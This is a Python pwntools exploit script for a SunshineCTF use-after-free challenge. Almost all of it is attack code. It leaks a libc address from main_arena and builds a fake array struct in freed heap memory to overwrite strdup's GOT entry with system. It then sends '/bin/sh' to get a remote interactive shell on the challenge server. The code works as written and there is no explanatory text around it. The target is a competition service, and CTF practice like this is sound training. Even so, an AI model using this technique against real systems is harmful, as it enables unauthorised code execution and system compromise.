from pwn import *
from time import sleep

#t = process('./uaf')
t = remote('chal1.sunshinectf.org', 20001)
binary = ELF('./uaf')
#sleep(3)
#print('Attach...')
t.recv()

# Leak main_arena pointer
t.sendline('2')
t.sendline('A'*0x85)
t.recvuntil('ID of text string: ')
first_id = t.recvline().strip()
t.sendline('2')
t.sendline('B'*0x85)
t.recvuntil('ID of text string: ')
second_id = t.recvline().strip()
t.sendline('7')
t.sendline(first_id)
t.sendline('5')
t.sendline(first_id)
t.recvuntil('Text string:\n"')
leak = t.recvuntil('"', drop=True)[:4]
leak = u32(leak)
libc = leak - 0x1b27b0
log.info("main_arena leak: {}".format(hex(leak)))

# Create int array
t.sendline('1')
t.sendline('3') # length of array
t.sendline('1 2 3')
t.recvuntil('ID of integer array: ')
arr_id = t.recvline().strip()
log.info("Created int array: {}".format(arr_id))

# Delete int array
t.sendline('6')
t.sendline(arr_id)
t.recv()
log.info("Deleted int array: {}".format(arr_id))

# Create fake int array struct with string item
buf = p32(0x42424242)				# struct int_array -> count
buf += p32(binary.got['strdup'])	# struct int_array -> items
t.sendline('2')
t.sendline(buf)
t.recvuntil('ID of text string: ')
str_id = t.recvline().strip()
log.info("Created string: {}".format(str_id))

# Edit int array - overwrite strdup GOT with system
t.sendline('3')
t.sendline(arr_id)	# array id
t.sendline('0') 	# index to edit

system = libc + 0x3ada0
log.info("system: {}".format(hex(system)))
system = (-0x7fffffff + (system - 0x7fffffff)) - 2	# convert unsigned to signed for scanf

log.info("Writing system to strdup GOT")
t.sendline(str(system))

# Trigger strdup
log.info("Spawning shell")
t.sendline('2')
t.sendline('/bin/sh')

t.recv()
t.interactive()